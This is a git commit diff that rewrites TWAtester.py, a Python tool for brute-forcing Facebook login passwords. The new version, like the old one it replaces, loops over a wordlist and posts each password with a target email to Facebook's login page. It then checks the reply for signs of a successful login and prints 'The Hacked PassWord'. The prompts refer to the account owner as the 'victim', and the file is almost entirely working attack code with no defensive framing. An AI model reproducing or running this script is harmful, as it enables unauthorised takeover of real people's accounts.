946e524534bc0ae3e5f2e12881de5bad64c4dfcd
Md E.H <109217697+e-h-a@users.noreply.github.com>
2022-07-13 20:22:34 +0600

    Update TWAtester.py

--- TWAtester.py
+++ TWAtester.py
@@ -1,55 +1,53 @@
-import time
+import os.path
+import requests
+from bs4 import BeautifulSoup
 import sys
-
-if sys.version_info[0] !=2: 
-	print('''--------------------------------------
-	REQUIRED PYTHON 2.x
-	Use Valid Code Brother .
---------------------------------------
-			''')
-	sys.exit()
-
-post_url='https://www.facebook.com/login.php'
-headers = {
-	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
+if sys.version_info[0] != 3:
+    print('''\t--------------------\n\t\tYOU WILL NEED PYTHON 3.x\n\t\t After install python in your system write this command -->> python3 
+    fb.py\n\t---------------------''')
+    sys.exit()
+PASSWORD_FILE = "wordtext.txt"
+MIN_PASSWORD_LENGTH = 6
+POST_URL = 'https://www.facebook.com/login.php'
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
 }
-
-try:
-	import mechanize
-	import urllib2
-	browser = mechanize.Browser()
-	browser.addheaders = [('User-Agent',headers['User-Agent'])]
-	browser.set_handle_robots(False)
-except:
-	print('\n\tPlease install mechanize.\n')
-	sys.exit()
-
-print('\n--------- Welcome To FB pass Testing By TWA ---------\n')
-file=open('wordtext.txt','r')
-
-email=str(raw_input('Enter Email/Username : ').strip())
-
-print ("\n Target Email ID : ",email)
-print ("\n Matching words from list. Remember it Will kill your long time . . .")
-
-i=0
-while file:
-	passw=file.readline().strip()
-	i+=1
-	if len(passw) < 6:
-		continue
-	print str(i) +" : ",passw
-	response = browser.open(post_url)
-	try:
-		if response.code == 200:
-			browser.select_form(nr=0)
-			browser.form['email'] = email
-			browser.form['pass'] = passw
-			response = browser.submit()
-			response_data = response.read()
-			if 'Find Friends' in response_data or 'Two-factor authentication' in response_data or 'security code' in response_data:
-				print('Your password is : ',passw)
-				break
-	except:
-		print('\nSleeping for time : 5 min\n')
-		time.sleep(300)
+PAYLOAD = {}
+COOKIES = {}
+def create_form():
+    form = dict()
+    cookies = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}
+    data = requests.get(POST_URL, headers=HEADERS)
+    for i in data.cookies:
+        cookies[i.name] = i.value
+    data = BeautifulSoup(data.text, 'html.parser').form
+    if data.input['name'] == 'lsd':
+        form['lsd'] = data.input['value']
+    return form, cookies
+def trying_to_passWord(email, index, password):
+    global PAYLOAD, COOKIES
+    if index % 10 == 0:
+        PAYLOAD, COOKIES = create_form()
+        PAYLOAD['email'] = email
+    PAYLOAD['pass'] = password
+    r = requests.post(POST_URL, data=PAYLOAD, cookies=COOKIES, headers=HEADERS)
+    if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text or "Log Out" in r.text:
+        open('temp', 'w').write(str(r.content))
+        print('\nWOW! Congrats. The Hacked PassWord is : ', password)
+        return True
+    return False
+if __name__ == "__main__":
+    print('\n---------- Welcome To TWA  pass  tester ----------\n\n------Be prepeare to kill your unlimited time------\n')
+    if not os.path.isfile(PASSWORD_FILE):
+        print("File of wordlist not found: ", PASSWORD_FILE)
+        sys.exit(0)
+    password_data = open(PASSWORD_FILE, 'r').read().split("\n")
+    print("Selected the Pass list: ", PASSWORD_FILE)
+    email = input('Type username or email of victim (perfectly) : ').strip()
+    for index, password in zip(range(password_data.__len__()), password_data):
+        password = password.strip()
+        if len(password) < MIN_PASSWORD_LENGTH:
+            continue
+        print("Here we go with pass [", index, "]: ", password)
+        if trying_to_passWord(email, index, password):
+            break
